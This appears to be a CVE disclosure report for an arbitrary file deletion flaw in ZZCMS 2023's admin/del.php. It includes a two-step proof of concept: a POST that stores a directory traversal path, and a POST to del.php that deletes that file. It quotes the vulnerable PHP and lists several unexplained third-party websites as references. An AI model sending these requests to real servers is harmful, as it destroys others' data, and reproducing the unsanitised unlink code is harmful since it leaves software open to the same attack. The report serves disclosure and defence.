# ZZCMS 2023 任意文件删除漏洞 admin/del.php

## CVE-ID

**CVE-2024-43011**

## Vulnerability type 

Insecure Permissions 

## Vendor of the product(s) 

http://www.zzcms.net/about/download.html

## Affected product(s)/code base 

## Product	* Version	

ZZCMS
<=2023(latest)



## Optional

Has vendor confirmed or acknowledged the vulnerability? No

## Attack type info 

Remote

Other : With administrator rights, attacker can delete any file.

## Affected component(s)

```
The vulnerability exists in the admin/del.php file at line 62, unlink($f);
```



## Attack vector(s)

```
[Administrator permissions required.]An arbitrary file deletion vulnerability exists in the admin/del.php file at line 62. Due to insufficient validation and sanitization of user input for file paths, an attacker can exploit this vulnerability by using directory traversal techniques to delete arbitrary files on the server. This can lead to the deletion of critical files, potentially disrupting the normal operation of the system.
Exploitation Examples:
Insert the file path to be deleted:
URL: http://127.0.0.3/admin/zs_edit.php
POST Data: action=add&passed=1&classid=1&groupid_guest=1&jifen=1&flv=test/../uploadfiles/../1.php
Delete the file:
URL: http://127.0.0.3/admin/del.php
POST Data: id={}&tablename=zzcms_zhaoshang
[Note that the id we need to try,1,2,3,4......]
```



## Suggested description of the vulnerability for use in the CVE 

```
An arbitrary file deletion vulnerability exists in the admin/del.php file at line 62. Due to insufficient validation and sanitization of user input for file paths, an attacker can exploit this vulnerability by using directory traversal techniques to delete arbitrary files on the server. This can lead to the deletion of critical files, potentially disrupting the normal operation of the system.
```



## Discoverer(s)/Credits info

GKDf1sh



## Reference(s) info

```
https://www.88zsw.com
http://www.818yyzs.com
https://www.qibai.cc
http://www.weixumu.cn
http://www.eshouyao.com
http://www.66988.tv/
http://www.dl580.tv/
```



## Additional information

```PHP
[Administrator permissions required.]
Vulnerable Code in admin/del.php file :
if ($tablename == "zzcms_zhaoshang") {
    checkadminisdo("zs_del");
    if (strpos($id, ",") > 0) {
        $sql = "select classid,img,flv,id,sm from zzcms_zhaoshang where id in (" . $id . ")";
    } else {
        $sql = "select classid,img,flv,id,sm from zzcms_zhaoshang where id='$id'";
    }
    $rs = query($sql);
    while ($row = fetch_array($rs)) {
/*Omission of this part*/

        if ($row["flv"] <> "" && substr($row["flv"], 0, 4) <> "http" && strpos($row["flv"], '/uploadfiles') !== false) {
            $f = "../" . substr($row['flv'], 1);
            if (file_exists($f)) {
                unlink($f);
            }
        }
```

